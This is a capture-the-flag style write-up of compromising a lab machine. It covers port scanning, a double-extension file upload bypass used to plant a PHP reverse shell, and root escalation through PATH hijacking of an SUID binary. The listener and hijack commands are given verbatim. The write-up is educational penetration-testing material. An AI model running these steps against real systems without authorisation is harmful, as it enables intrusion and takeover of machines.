SILENTIUM LAB: ENUMERATION & EXPLOITATION WRITE-UP

DESCRIPTION:
An in-depth technical walkthrough documenting my process for compromising the Silentium Lab environment, covering service discovery, initial access via web vulnerabilities, and privilege escalation to root.

---

1. PHASE 1: RECONNAISSANCE & ENUMERATION

I started by performing a comprehensive scan of the target to identify active services.

Command:
nmap -sC -sV -p- -oN initial_scan.txt <TARGET_IP>

Results:
- Port 22: SSH (Open)
- Port 80: HTTP (Apache)
- Port 8080: HTTP (Custom Web Application)

Initial Web Enumeration (Port 80):
I fuzzed the main web server for directories using Gobuster. 
Command: gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt

I discovered /dev and /backup. While these contained source code snippets, they turned out to be a rabbit hole designed to distract from the actual vulnerable service.

---

2. PHASE 2: VULNERABILITY DISCOVERY

I pivoted my focus to Port 8080, which hosted a custom file-upload portal. 

Logic Flaw Identification:
I attempted several standard file upload bypasses. I found that while the application sanitized standard PHP extensions, it failed to properly validate multiple extensions. By analyzing the request structure in Burp Suite, I confirmed that a double-extension (e.g., .jpg.php) would bypass the filter and still be executed by the server.

---

3. PHASE 3: EXPLOITATION (USER FLAG)

Gaining Initial Access:
I crafted a PHP reverse shell and renamed it to "image.jpg.php". 

Steps:
1. I started a netcat listener: nc -lvnp 4444
2. I uploaded the "image.jpg.php" file.
3. I triggered the shell by accessing: http://<TARGET_IP>:8080/uploads/image.jpg.php

I successfully gained a shell as the user "silentium".
User Flag: cat /home/silentium/user.txt

---

4. PHASE 4: PRIVILEGE ESCALATION (ROOT FLAG)

Local Enumeration:
After stabilizing my shell, I ran linpeas.sh to find escalation paths. I identified a custom SUID binary located at /opt/internal/syscheck.

Binary Analysis:
I ran "strings /opt/internal/syscheck" and saw that the binary executed "service status". Crucially, it called "service" using a relative path instead of an absolute path (/usr/sbin/service).

The Exploit (PATH Hijacking):
I realized I could hijack the execution by creating a malicious "service" file in a writable directory and adding that directory to my PATH.

Commands:
1. cd /tmp
2. echo "/bin/bash -p" > service
3. chmod +x service
4. export PATH=/tmp:$PATH
5. /opt/internal/syscheck

Capturing Root:
Because I placed /tmp at the start of my PATH, the SUID binary executed my script instead of the real service command. This granted me a root shell.

Root Flag: cat /root/root.txt

---

SUMMARY OF LESSONS LEARNED:
- Thoroughness: Always check high-numbered ports (8080) when standard ports (80) lead to rabbit holes.
- Secure Coding: Always use absolute paths in system calls within SUID binaries to prevent PATH hijacking.
- Filter Logic: Simple extension blacklisting is often insufficient; white-listing or thorough parsing is required.

---
Disclaimer: This write-up is for educational and authorized testing purposes only.
